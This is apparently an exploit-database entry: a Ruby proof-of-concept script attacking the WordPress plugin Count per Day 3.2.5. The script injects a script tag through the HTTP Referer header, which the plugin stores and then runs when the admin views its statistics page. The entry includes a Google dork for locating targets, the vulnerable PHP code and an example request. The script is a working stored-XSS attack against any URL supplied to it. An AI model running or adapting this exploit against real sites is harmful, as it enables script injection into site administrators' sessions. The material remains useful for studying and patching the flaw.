#!/usr/bin/ruby
# Exploit Title: WordPress Count per Day 3.2.5 CSRF
# Google Dork: inurl:"/wp-content/plugins/count-per-day
# Date: 18.03.2013
# Exploit Author: m3tamantra (http://m3tamantra.wordpress.com/blog)
# Vendor Homepage: http://wordpress.org/extend/plugins/count-per-day/
# Software Link: http://downloads.wordpress.org/plugin/count-per-day.3.2.5.zip
# Version: 3.2.5
# Tested on: Apache/2.2.16 (Debian) PHP 5.3.3-7+squeeze14 with Suhosin-Patch (cli)
# 
#
# Because this is my first Vulnerability I ever found by my self, I wrote a PoC script
# I know that this is overkill and the Vulnerability is trivial to exploit :P
# The JavaScript Payload is executed when the Admin views Count per Day - Statistics
#
# Note: Like the name says "Count per Day" will only count an Visitor one time per Day per Page
#  $date = date_i18n('Y-m-d');
#  // new visitor on page?
#  $count = $this->mysqlQuery('var', $wpdb->prepare("SELECT COUNT(*) FROM $wpdb->cpd_counter WHERE ip=$this->aton(%s) AND date=%s AND page=%d", $userip, $date, $page), 'count check '.__LINE__);
#
##########################################
### counter.php (Vulnerable Code part) ###
###############################################################################################################
#  120         $referer = ($this->options['referers'] && isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : '';
#  ...
#  ...
#  139                 $this->mysqlQuery('', $wpdb->prepare("INSERT INTO $wpdb->cpd_counter (page, ip, client, date, referer)
#  140                 VALUES (%s, $this->aton(%s), %s, %s, %s)", $page, $userip, $client, $date, $referer), 'count insert '.__LINE__);
################################################################################################################
#
### Example Request ############################################################################
# GET /wordpress/ HTTP/1.1
# Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
# Accept: */*
# User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0
# Referer: https://boards.4chan.org/b/<script>alert(666)</script>
# Connection: close
# Host: 127.0.0.1:9001
################################################################################################

require "net/http"
require "uri"

if(ARGV.length == 1)
    uri = URI.parse(ARGV[0])
    http = Net::HTTP.new(uri.host, uri.port)
    #http.set_debug_output($stderr)
    request = Net::HTTP::Get.new(uri.request_uri)
    request["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:19.0) Gecko/20100101 Firefox/19.0"
    request["Referer"] = "https://boards.4chan.org/b/<script>alert(666)</script>"
    http.request(request)
    puts "Have a nice day :-)"
else
    puts "Usage:\t\truby #{__FILE__} [WordPress URL]"
    puts "Example:\truby #{__FILE__} http://127.0.0.1/wordpress/?p=1\n"
end
